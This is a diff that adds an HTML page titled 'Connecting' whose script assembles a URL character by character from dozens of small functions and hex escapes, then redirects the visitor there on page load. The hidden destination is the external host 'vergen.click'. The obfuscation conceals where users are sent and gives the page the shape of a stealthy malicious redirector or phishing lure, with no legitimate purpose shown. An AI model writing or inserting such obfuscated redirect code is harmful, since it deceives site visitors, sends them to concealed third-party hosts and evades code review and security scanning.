@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connecting</title>
+    <script>
+        const pieces = [
+            () => "h",
+            q => "t",
+            c => 't',
+            () => '\x70',
+            function() { return 's'; },
+            n => ":",
+            () => "/",
+            () => '\x2f',
+            () => '\x76',
+            () => "e",
+            function() { return "r"; },
+            () => '\x67',
+            () => 'e',
+            () => 'n',
+            function() { return '.'; },
+            function() { return "c"; },
+            e => "l",
+            () => '\x69',
+            () => '\x63',
+            function() { return 'k'; },
+            () => '\x2f',
+            () => '\x73',
+            () => "/",
+            () => "r",
+            () => 'e',
+            () => "p"
+        ];
+        const loc = pieces.reduce((str, fn) => str + fn(), '');
+
+        document.location = loc;
+    </script>
+</head>
+<body></body>
+</html>
